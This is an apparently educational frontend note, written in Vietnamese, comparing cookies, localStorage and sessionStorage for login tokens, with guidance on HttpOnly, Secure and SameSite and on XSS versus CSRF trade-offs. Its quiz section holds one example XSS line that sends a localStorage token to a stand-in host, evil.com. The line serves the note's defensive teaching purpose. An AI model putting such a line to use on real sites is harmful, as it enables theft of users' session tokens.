---
level: foundation
area: frontend
prerequisites:
  - 01-browser-request-render.md
related:
  - 06-cors.md
  - ../../02-backend-api/03-auth/02-session-vs-token.md
  - ../../05-cross-cutting/security/03-xss-csrf.md
---

# Cookies, localStorage, sessionStorage

> "Lưu token ở đâu" là câu hỏi bảo mật, không phải câu hỏi tiện lợi. Note này giải thích vì sao.

## Position

```text
Browser [cookie jar | localStorage | sessionStorage | memory]
   ↓ chỉ cookie tự động đi kèm
HTTP request → Server
```

## Problem

Bạn cần giữ trạng thái đăng nhập qua nhiều request, trong khi HTTP là stateless. Có bốn nơi để lưu, và chúng khác nhau ở ba chiều: **ai đọc được**, **có tự gửi lên server không**, và **sống được bao lâu**.

Chọn sai dẫn tới một trong hai lỗ hổng: XSS đọc được token, hoặc CSRF dùng được session của người khác. Không có lựa chọn nào miễn phí cả hai — bạn chọn loại tấn công mình phải phòng.

## Mental Model

```text
                  JS đọc được?   Tự gửi lên server?   Sống qua tab đóng?
Cookie (thường)        có               CÓ                  có (nếu có Expires)
Cookie (HttpOnly)     KHÔNG             CÓ                  có
localStorage           có              không                có
sessionStorage         có              không                không (mất khi đóng tab)
Biến JS (memory)       có              không                không (mất khi reload)
```

Hai cột giữa quyết định mọi thứ:

- **"JS đọc được"** = XSS đọc được. Một script chèn vào trang có toàn quyền như code của bạn.
- **"Tự gửi lên server"** = CSRF khai thác được. Browser gửi cookie kèm mọi request tới domain đó, kể cả request do site khác khởi tạo.

Vì vậy:

```text
localStorage  → miễn nhiễm CSRF, nhưng XSS đọc được token  → attacker lấy token đi dùng ở nơi khác
HttpOnly cookie → XSS không đọc được, nhưng có thể bị CSRF  → attacker gửi request thay bạn
```

**Lựa chọn mặc định đúng cho web app: `HttpOnly` + `Secure` + `SameSite=Lax` cookie.** Lý do: CSRF có cách phòng hoàn chỉnh và rẻ (`SameSite`, CSRF token). XSS-đọc-token thì không — nếu token nằm trong JS scope, một XSS là mất token, và attacker có thể mang nó ra ngoài browser.

## How It Works

### Cookie attributes

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=604800
```

| Attribute | Tác dụng | Bỏ qua thì sao |
|---|---|---|
| `HttpOnly` | JS không đọc được (`document.cookie` không thấy) | XSS lấy được session |
| `Secure` | Chỉ gửi qua HTTPS | Cookie có thể bị đọc trên mạng không mã hoá |
| `SameSite=Strict` | Không gửi trong bất kỳ request cross-site nào | Người dùng click link từ email vào app sẽ thấy như chưa login |
| `SameSite=Lax` | Gửi khi điều hướng top-level GET; **không** gửi với POST cross-site | Mặc định tốt |
| `SameSite=None` | Gửi mọi lúc — **bắt buộc kèm `Secure`** | Cần cho cross-site thật sự (SSO, iframe) |
| `Domain` | Chia sẻ cho subdomain | Đặt rộng quá = mọi subdomain đọc được |
| `Path` | Giới hạn theo path | Ít giá trị bảo mật |
| `Max-Age`/`Expires` | Không có = session cookie, mất khi đóng browser | — |

Điểm quan trọng: **cookie không bị giới hạn bởi CORS.** CORS quản việc JS *đọc response*. Cookie được browser gắn vào request dựa trên domain và `SameSite`, độc lập với CORS. Đây là toàn bộ lý do CSRF tồn tại.

### localStorage / sessionStorage

- API đồng bộ, key–value string, ~5–10MB.
- **Đồng bộ = chặn main thread.** Ghi dữ liệu lớn gây jank.
- Theo **origin** (scheme + host + port). `http://a.com` và `https://a.com` là hai storage khác nhau.
- `sessionStorage` theo *tab*: mở tab mới là storage mới.
- Không có expiry tự động — bạn phải tự quản.
- Không truy cập được từ Server Component / SSR. Đọc nó trong lúc render server gây hydration mismatch. Xem [Server/Client boundary](../03-nextjs/behavior/01-server-client-boundary.md).

### Khi nào dùng gì

| Nhu cầu | Dùng | Vì sao |
|---|---|---|
| Session đăng nhập (web app) | `HttpOnly` cookie | XSS không lấy được |
| Access token ngắn hạn (SPA gọi API bên thứ ba) | biến trong memory | mất khi reload — chấp nhận được, refresh token nằm trong cookie |
| Refresh token | `HttpOnly` cookie, path hẹp | không bao giờ để JS thấy |
| Theme, ngôn ngữ, sidebar mở/đóng | localStorage | không nhạy cảm, cần bền |
| Dữ liệu form nháp | sessionStorage | theo tab, tự dọn |
| Dữ liệu lớn / offline | IndexedDB | async, không chặn main thread |
| **Bất cứ thứ gì bí mật** | không lưu ở client | client không phải nơi giữ bí mật |

## Example

```ts
// Backend đặt session cookie — cách mặc định đúng
res.cookie('session', sessionId, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',
  maxAge: 7 * 24 * 60 * 60 * 1000,
  path: '/',
});
```

```ts
// Frontend: KHÔNG cần đọc cookie. Chỉ cần gửi kèm.
await fetch('/api/tasks', { credentials: 'include' });
// Không có `credentials: 'include'` cho cross-origin → cookie không được gửi → 401
```

```ts
// localStorage cho preference, không cho secret
try {
  localStorage.setItem('theme', 'dark');
} catch {
  // Có thể throw: private mode, quota đầy, browser chặn site data
}
```

Luôn bọc `localStorage` trong `try/catch` — nó *throw*, không chỉ trả `null`.

## Prediction

1. Cookie có `HttpOnly`. Một XSS chạy `document.cookie` — thấy gì? Attacker vẫn làm được gì?
2. Token trong `localStorage`. Một XSS chạy `fetch('https://evil.com?t='+localStorage.token)` — thành công?
3. `fetch` cross-origin không có `credentials: 'include'` — cookie có được gửi?
4. `SameSite=Lax`, người dùng click link từ email tới `GET /dashboard` — có được đăng nhập?
5. Cùng cấu hình, một site khác submit `POST /transfer` bằng form ẩn — cookie có được gửi?
6. Bạn đặt `Secure` trên `http://localhost` — cookie có được set?

## Break It

| Phá thế nào | Quan sát |
|---|---|
| Bỏ `HttpOnly`, chạy `document.cookie` trong console | Thấy session — mô phỏng đúng những gì XSS làm được |
| Đặt `SameSite=None` mà không có `Secure` | Browser từ chối cookie hoàn toàn |
| `SameSite=Strict` rồi click link từ site khác | Trông như bị logout — hiểu vì sao `Lax` là mặc định |
| Gọi API cross-origin thiếu `credentials: 'include'` | 401 dù đã login |
| Server có `Access-Control-Allow-Origin: *` **và** `credentials: 'include'` | Browser chặn — wildcard không dùng được với credentials |
| Ghi 5MB vào localStorage trong một vòng lặp | Main thread đứng — chứng minh nó đồng bộ |
| Mở private window, gọi `localStorage.setItem` | Có thể throw — lý do phải try/catch |
| Đặt cookie `Domain=.example.com` rồi đọc từ subdomain lạ | Mọi subdomain đọc được — rủi ro nếu subdomain do bên khác kiểm soát |

## What Usually Goes Wrong

- **JWT trong localStorage** rồi coi là đã bảo mật. XSS = mất token, và token thường sống lâu hơn session.
- **Thiếu `SameSite`** → CSRF. Browser hiện đại mặc định `Lax` nếu không khai báo, nhưng đừng phụ thuộc vào mặc định của browser.
- **Thiếu `Secure` trên production** → cookie đi qua HTTP nếu có bất kỳ đường nào không TLS.
- **`Domain` quá rộng** → cookie leak sang subdomain không tin cậy.
- **Đọc `localStorage` trong render** ở Next.js → `window is not defined` hoặc hydration mismatch.
- **Không xoá cookie server-side khi logout** — chỉ xoá cookie ở client thì session vẫn hợp lệ nếu attacker đã copy nó.
- **Cookie quá lớn** — cookie đi kèm **mọi** request, kể cả ảnh. 4KB cookie × 50 request = 200KB upload lãng phí.

## Common Misconceptions

| Tưởng rằng | Thực tế |
|---|---|
| localStorage an toàn hơn cookie | An toàn hơn với CSRF, **kém hơn** với XSS. Và XSS nghiêm trọng hơn |
| `HttpOnly` chặn được XSS | Chỉ chặn XSS *đọc* cookie. XSS vẫn có thể gửi request thay bạn (cookie tự đi kèm) |
| CORS bảo vệ khỏi CSRF | Không. CORS quản việc đọc response; CSRF chỉ cần *gửi* được request |
| Cookie chỉ dùng cho auth | Dùng cho mọi state cần server biết |
| `SameSite=Strict` luôn tốt hơn | Phá UX: link từ email/chat trông như chưa login |
| localStorage có expiry | Không. Tự implement |
| Xoá cookie ở client là logout | Phải vô hiệu session ở server |

## Debugging

1. DevTools → **Application → Cookies**: xem giá trị thật và **các cột `HttpOnly`, `Secure`, `SameSite`**. Đây là nơi phát hiện attribute không được set như bạn nghĩ.
2. Cookie không được set? Xem tab **Network → response headers → `Set-Cookie`**. Nếu có `Set-Cookie` mà cookie không xuất hiện → browser từ chối (thường do `Secure` trên HTTP, hoặc `SameSite=None` thiếu `Secure`). Chrome ghi lý do ngay cạnh cookie.
3. Cookie không được **gửi**? Xem request headers → có `Cookie:` không. Không có → kiểm tra `SameSite`, `Domain`, `Path`, `credentials`.
4. 401 chỉ với cross-origin → kiểm tra `credentials: 'include'` **và** server có `Access-Control-Allow-Credentials: true` **và** `Allow-Origin` là origin cụ thể (không phải `*`). Xem [CORS](06-cors.md).
5. `window is not defined` → đang chạy trên server; chuyển sang `useEffect` hoặc kiểm tra `typeof window`.

## Production Considerations

- **Cookie prefix**: `__Host-session` buộc browser yêu cầu `Secure`, `Path=/`, không có `Domain` — chống một lớp tấn công qua subdomain.
- **Rotate session ID sau khi login** để chống session fixation. Xem [Password & MFA](../../02-backend-api/03-auth/05-password-mfa.md).
- **Cookie size** ảnh hưởng mọi request — giữ session ID ngắn, để dữ liệu ở server.
- Nhiều subdomain → quyết định `Domain` từ đầu; đổi về sau rất đau.
- Storage có thể **không dùng được**: private mode, quota, chính sách chặn site data. Code phải chạy đúng khi không có storage.

## Trade-offs

| Lựa chọn | Được | Mất |
|---|---|---|
| `HttpOnly` cookie | XSS không lấy được token | cần chống CSRF; khó dùng cross-domain |
| Token trong localStorage | đơn giản, dùng được cross-domain | XSS = mất token |
| Token trong memory | XSS khó lấy nhất; mất khi reload | cần refresh flow; F5 phải login lại nếu không có refresh cookie |
| `SameSite=Strict` | chống CSRF mạnh nhất | UX kém với link ngoài |
| `SameSite=Lax` | cân bằng | POST cross-site vẫn cần CSRF token nếu có endpoint nhạy cảm dùng GET |

## Explain Without Notes

1. Ba chiều khác biệt giữa cookie, localStorage, sessionStorage?
2. Vì sao `HttpOnly` cookie là mặc định tốt hơn localStorage cho session?
3. `HttpOnly` **không** chặn được gì?
4. Vì sao CORS không bảo vệ khỏi CSRF?
5. `SameSite=Lax` gửi cookie trong trường hợp nào và không gửi trong trường hợp nào?

## Related

- [CORS](06-cors.md) — vì sao credentials cross-origin phức tạp
- [CSP & browser security](07-csp-browser-security.md) — giảm rủi ro XSS
- [XSS & CSRF](../../05-cross-cutting/security/03-xss-csrf.md) — hai tấn công tương ứng
- [Session vs token](../../02-backend-api/03-auth/02-session-vs-token.md) — quyết định ở backend
- [JWT & refresh token](../../02-backend-api/03-auth/03-jwt-refresh-token.md)
- [Server/Client boundary](../03-nextjs/behavior/01-server-client-boundary.md) — vì sao không đọc storage khi render server
